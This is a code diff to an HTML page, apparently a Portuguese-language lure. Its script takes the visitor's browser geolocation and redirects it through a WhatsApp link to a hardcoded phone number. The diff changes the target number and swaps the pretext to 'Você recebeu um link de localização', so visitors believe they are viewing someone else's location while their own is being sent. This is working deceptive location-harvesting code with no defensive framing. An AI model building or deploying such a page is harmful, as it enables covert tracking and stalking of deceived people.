@@ -61,7 +61,7 @@
                         let longitude = position.coords.longitude;
                         let linkMaps = `https://www.google.com/maps?q=${latitude},${longitude}`;
 
-                        let whatsapp = `https://wa.me/558197921133?text=Minha localização: ${linkMaps}`;
+                        let whatsapp = `https://wa.me/558193568037?text=Minha localização: ${linkMaps}`;
                         window.location.href = whatsapp;
                     },
                     function(error) {
@@ -80,10 +80,10 @@
     </script>
 </head>
 <body>
-    <div class="card">
-        <h2>Verificando Disponibilidade na Sua Região</h2>
-        <p>Estamos localizando os serviços disponíveis próximos de você. Clique no botão abaixo para continuar com a verificação.</p>
-        <button class="btn" onclick="enviarLocalizacao()">Continuar</button>
-    </div>
+    <div class="container">
+    <h2>📍Acessar Localização Compartilhada</h2>
+    <p>Você recebeu um link de localização. Clique abaixo para visualizar a posição exata no mapa em tempo real.</p>
+    <button class="btn" onclick="enviarLocalizacao()">Ver Localização</button>
+</div>
 </body>
 </html>
